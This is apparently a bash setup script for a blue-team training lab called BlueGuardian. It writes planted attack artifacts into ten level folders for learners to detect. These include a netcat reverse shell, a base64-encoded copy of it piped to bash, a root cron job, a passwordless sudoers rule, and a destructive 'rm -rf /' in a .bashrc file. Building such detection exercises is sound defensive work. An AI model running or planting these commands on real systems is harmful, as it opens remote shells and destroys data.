#!/bin/bash

mkdir -p ~/blueguardian
cd ~/blueguardian

# Loop to create levels dynamically
for i in {01..10}; do
    mkdir level$i
done

# Add specific challenge files for each level
echo "Failed password for invalid user admin from 192.168.1.55" > level01/auth.log
echo "nc -e /bin/bash 192.168.1.99 4444" > level02/process.txt
echo "* * * * * root /tmp/evil.sh" > level03/evil_cron
echo "echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS45OSA0NDQ0Cg== | base64 -d | bash" > level04/red.txt
echo "attacker ALL=(ALL:ALL) NOPASSWD:ALL" > level05/sudoers.d
echo "tcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN" > level06/netstat.txt
echo "rm -rf / --no-preserve-root" > level07/.bashrc
echo "-rw-rw-rw- 1 attacker attacker 2048 May 10 11:00 secrets.txt" > level08/permissions.txt
echo "<h1>You’ve been hacked by RedTeam!</h1>" > level09/index.html
echo "Status: inactive" > level10/ufw_status.txt

echo "BlueGuardian setup complete!"
